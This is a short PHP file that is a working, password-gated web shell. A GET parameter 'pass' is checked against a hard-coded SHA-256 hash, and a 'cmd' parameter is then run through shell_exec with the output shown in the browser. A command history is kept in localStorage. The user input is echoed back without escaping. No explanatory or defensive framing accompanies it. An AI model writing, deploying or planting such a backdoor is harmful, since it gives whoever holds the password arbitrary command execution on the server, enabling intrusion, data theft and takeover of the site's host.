<?php $password = '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8';?>
<?php if (isset($_GET['pass']) and hash('sha256', $_GET['pass']) == $password): ?>
    <textarea name="previousResults" id="previousResults" cols="80" rows="10" readonly></textarea>
    <form action="<?php echo basename($_SERVER['PHP_SELF']); ?>" method="get">
        <input type="hidden" name="pass" value="<?php echo $_GET['pass'];?>">
        <input type="text" name="cmd" id="cmd" autofocus size="80">
        <input type="submit" value="Execute">
        <button id="clear" onclick="javascript:clearHistory();">Clear</button>
    </form>
    <script>
        <?php if (isset($_GET['cmd']))
        {
            $result = shell_exec($_GET['cmd']); 
        }
        ?>
        let command = "<?php echo $_GET['cmd'] ?? '' ; ?>"; 
        let result = "<?php echo base64_encode($result ?? ''); ?>";
        let previousResults = JSON.parse(localStorage.getItem("previousResults")) || [];
        if ((command.length > 0) && result.length > 0){
            previousResults.push({"cmd" : command, "result": result});
            localStorage.setItem("previousResults", JSON.stringify(previousResults));
        }

        let textArea = document.getElementById("previousResults");

        for (let i = 0; i < previousResults.length; i++) {
            let hist = previousResults[i];
            textArea.value += hist['cmd'] + '\r\n' + atob(hist['result']) + '\r\n';
        }
        textArea.scrollTop = textArea.scrollHeight;

        function clearHistory() {
            localStorage.removeItem("previousResults");
        }
    </script>
    <?php die(); ?>
<?php endif; ?>